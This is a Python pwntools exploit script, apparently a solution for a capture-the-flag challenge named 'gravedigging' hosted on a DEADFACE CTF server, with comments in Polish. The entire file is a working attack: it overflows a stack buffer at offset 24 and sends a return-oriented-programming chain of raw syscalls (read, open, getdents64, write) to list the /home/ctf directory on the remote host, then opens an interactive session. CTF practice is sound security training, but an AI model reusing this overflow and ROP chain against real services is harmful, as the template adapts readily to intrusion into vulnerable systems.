#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import struct

context.log_level = 'warning'
context.update(arch='x86_64', os='linux')
context.terminal = ['cmd.exe', '/c', 'start', 'wsl.exe']

HOST="env02.deadface.io:5632"
ADDRESS,PORT=HOST.split(":")

BINARY_NAME="./gravedigging"
binary = context.binary = ELF(BINARY_NAME, checksec=False)

if args.REMOTE:
    p = remote(ADDRESS,PORT)
else:
    p = process(binary.path)

# --- gadgets / bss ---
rop = ROP(binary)
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address
pop_rdx = rop.find_gadget(['pop rdx', 'ret']).address
pop_rax = rop.find_gadget(['pop rax', 'ret']).address
syscall = rop.find_gadget(['syscall', 'ret']).address
bss = binary.bss()

# --- buffers / sizes ---
dent_buf = bss + 0x300
dent_size = 0x800    # większy bufor
path_len = 0x80      # długość ścieżki do odczytu do .bss
offset = 24

# --- build chain: read(path)->open->getdents64->write ---
chain = b""
# read(0, bss, path_len)
chain += p64(pop_rdi) + p64(0)
chain += p64(pop_rsi) + p64(bss)
chain += p64(pop_rdx) + p64(path_len)
chain += p64(pop_rax) + p64(0)
chain += p64(syscall)

# open(bss, O_RDONLY=0, 0)
chain += p64(pop_rdi) + p64(bss)
chain += p64(pop_rsi) + p64(0)
chain += p64(pop_rdx) + p64(0)
chain += p64(pop_rax) + p64(2)
chain += p64(syscall)

# fallback: ustaw rdi=3 (zakładamy fd=3)
chain += p64(pop_rdi) + p64(3)

# getdents64(fd, dent_buf, dent_size) syscall 217
chain += p64(pop_rsi) + p64(dent_buf)
chain += p64(pop_rdx) + p64(dent_size)
chain += p64(pop_rax) + p64(217)
chain += p64(syscall)

# fallback: ustaw rdx = dent_size
chain += p64(pop_rdx) + p64(dent_size)

# write(1, dent_buf, rdx)
chain += p64(pop_rdi) + p64(1)
chain += p64(pop_rsi) + p64(dent_buf)
chain += p64(pop_rax) + p64(1)
chain += p64(syscall)

# payload (bez powrotu do main)
payload = b'A'*offset + chain

# --- send payload and path ---
p.sendlineafter(b'Which Grave shall you search?', payload)
#p.send(b'/home/ctf/gravedigging\x00')   # wysyłamy katalog
p.send(b'/home/ctf\x00')   # wysyłamy katalog


p.interactive()

